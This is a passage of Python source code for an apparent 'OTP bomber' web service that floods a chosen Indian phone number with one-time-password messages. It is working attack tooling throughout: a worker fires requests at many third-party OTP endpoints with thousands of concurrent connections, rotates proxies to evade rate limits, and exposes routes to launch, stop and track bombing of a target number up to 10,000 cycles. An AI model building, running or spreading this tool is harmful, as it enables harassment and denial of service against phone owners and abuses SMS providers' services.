            low = text[:300].lower()
            if any(k in low for k in OTP_KEYWORDS):
                stats["otp_ok"] += 1
        else:
            stats["failed"] += 1
    except Exception:
        stats["total"] += 1
        stats["failed"] += 1


# ═══════════════════════════════════════════════════════════
# 💣 WORKER — 5000 concurrent + proxy rotation
# ═══════════════════════════════════════════════════════════
async def bomb_worker(job_id: str, phone: str, count: int):
    _stop_numbers.discard(phone)

    await refresh_proxies(force=True)
    if not _proxy_pool:
        print(f"[{job_id}] ⚠️ No proxies available — running direct")

    connector = aiohttp.TCPConnector(
        limit=MAX_CONCURRENT, limit_per_host=200,
        ttl_dns_cache=300, force_close=False,
        enable_cleanup_closed=True,
    )
    timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT, connect=CONNECT_TIMEOUT)
    headers_base = {"Connection": "keep-alive", "Accept-Encoding": "gzip, deflate"}

    stats = _global_stats[phone]
    stats["total"] = stats["http_ok"] = stats["otp_ok"] = stats["failed"] = 0
    stats["start"] = time.time()

    print(f"\n{'='*70}")
    print(f"[{job_id}] 🔥 BOMB START | +91{phone} | count={count}")
    print(f"[{job_id}] APIs={len(ULTIMATE_APIS)} | Workers={MAX_CONCURRENT} | Proxies={len(_proxy_pool)}")
    print(f"{'='*70}")

    try:
        async with aiohttp.ClientSession(
            connector=connector, timeout=timeout, headers=headers_base
        ) as session:
            for cycle in range(count):
                if phone in _stop_numbers:
                    print(f"[{job_id}] 🛑 Stopped at cycle {cycle+1}")
                    break

                tasks = []
                for api in ULTIMATE_APIS:
                    # Every 10-20 devices → new proxy (session rotation)
                    proxy = pick_proxy()
                    proxy_url = f"http://{proxy}" if proxy else None
                    session_id = str(uuid4())[:8]

                    tasks.append(fire_one(session, api, phone, stats, proxy_url, session_id))

                # Execute in chunks
                for i in range(0, len(tasks), BATCH_CHUNK):
                    chunk = tasks[i:i + BATCH_CHUNK]
                    await asyncio.gather(*chunk, return_exceptions=True)

                elapsed = time.time() - stats["start"]
                rps = stats["total"] / elapsed if elapsed else 0
                print(f"[{job_id}] Cycle {cycle+1}/{count} | "
                      f"Total={stats['total']} | HTTP_OK={stats['http_ok']} | "
                      f"OTP={stats['otp_ok']} | {rps:.1f}/s")

                if time.time() - _proxy_last_fetch > PROXY_REFRESH_INTERVAL:
                    await refresh_proxies(force=True)

                await asyncio.sleep(0.05)
    except Exception as e:
        print(f"[{job_id}] ❌ {e}")
    finally:
        _running_jobs.pop(job_id, None)
        print(f"[{job_id}] ✅ DONE | Total={stats['total']} | "
              f"HTTP_OK={stats['http_ok']} | OTP={stats['otp_ok']} | Failed={stats['failed']}")


# ═══════════════════════════════════════════════════════════
# 🌐 ROUTES
# ═══════════════════════════════════════════════════════════
@app.get("/", response_class=HTMLResponse)
async def root():
    return f"""
    <html><head><title>ULTIMATE OTP BOMBER v7.0</title></head>
    <body style="font-family:monospace;background:#0a0a0a;color:#0f0;padding:20px">
    <h1>🔥 ULTIMATE OTP BOMBER v7.0</h1>
    <p>APIs: <b>{len(ULTIMATE_APIS)}</b> | Workers: <b>{MAX_CONCURRENT}</b> | Proxies: <b>{len(_proxy_pool)}</b></p>
    <ul>
      <li><a href="/health" style="color:#0ff">/health</a></li>
      <li><a href="/proxies?refresh=1" style="color:#0ff">/proxies?refresh=1</a></li>
      <li><a href="/send?number=9876543210&count=10" style="color:#0ff">/send?number=9876543210&count=10</a></li>
      <li><a href="/stop?number=9876543210" style="color:#0ff">/stop?number=9876543210</a></li>
      <li><a href="/stats?number=9876543210" style="color:#0ff">/stats?number=9876543210</a></li>
    </ul>
    </body></html>
    """


@app.get("/health")
async def health():
    return {
        "status": "ok",
        "total_apis": len(ULTIMATE_APIS),
        "max_workers": MAX_CONCURRENT,
        "proxies_loaded": len(_proxy_pool),
        "time": datetime.now().isoformat(),
    }


@app.get("/proxies")
async def list_proxies(refresh: int = 0):
    if refresh:
        await refresh_proxies(force=True)
    return {
        "total": len(_proxy_pool),
        "last_fetch": datetime.fromtimestamp(_proxy_last_fetch).isoformat() if _proxy_last_fetch else None,
        "proxies": _proxy_pool[:100],
    }


@app.get("/send")
async def send_endpoint(
    bg: BackgroundTasks,
    number: str = Query(..., description="10 digit phone"),
    count: int = Query(1),
):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    if not number.isdigit() or len(number) != 10:
        return JSONResponse({"success": False, "error": "Invalid number"}, 400)
    if count <= 0 or count > 10000:
        return JSONResponse({"success": False, "error": "count 1-10000"}, 400)

    job_id = str(uuid4())[:8]
    _running_jobs[job_id] = {"number": number, "count": count}
    bg.add_task(bomb_worker, job_id, number, count)

    return {
        "success": True,
        "job_id": job_id,
        "target": f"+91{number}",
        "count": count,
        "apis": len(ULTIMATE_APIS),
        "total_requests": count * len(ULTIMATE_APIS),
        "workers": MAX_CONCURRENT,
        "proxies": len(_proxy_pool),
        "device_per_session": DEVICE_PER_SESSION,
        "stop_url": f"/stop?number={number}",
        "stats_url": f"/stats?number={number}",
    }


@app.get("/stop")
async def stop_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    _stop_numbers.add(number)
    killed = [jid for jid, j in list(_running_jobs.items()) if j["number"] == number]
    return {"success": True, "message": f"🛑 Stop for +91{number}", "killed_jobs": killed}


@app.get("/stats")
async def stats_endpoint(number: str = Query(...)):
    number = number.strip().replace("+", "").replace(" ", "").replace("-", "")
    s = _global_stats.get(number, {})
    if not s:
        return {"success": False, "error": "no stats"}
    elapsed = time.time() - s.get("start", time.time())
    return {
        "success": True, "number": f"+91{number}",
        "total": s.get("total", 0), "http_ok": s.get("http_ok", 0),
        "otp_ok": s.get("otp_ok", 0), "failed": s.get("failed", 0),
        "elapsed": round(elapsed, 2),
        "rps": round(s["total"] / elapsed, 1) if elapsed else 0,
    }


# ═══════════════════════════════════════════════════════════
# 🚀 RUN
# ═══════════════════════════════════════════════════════════
if __name__ == "__main__":
    print(f"""
╔══════════════════════════════════════════════════════════╗
║   🔥 ULTIMATE OTP BOMBER API v7.0                       ║
║   ▸ APIs     : {len(ULTIMATE_APIS)}
║   ▸ Workers  : {MAX_CONCURRENT}
║   ▸ Proxies  : auto-fetch
║   ▸ Server   : http://0.0.0.0:5000
╚══════════════════════════════════════════════════════════╝
    """)
    uvicorn.run(app, host="0.0.0.0", port=5000, log_level="warning", access_log=False)
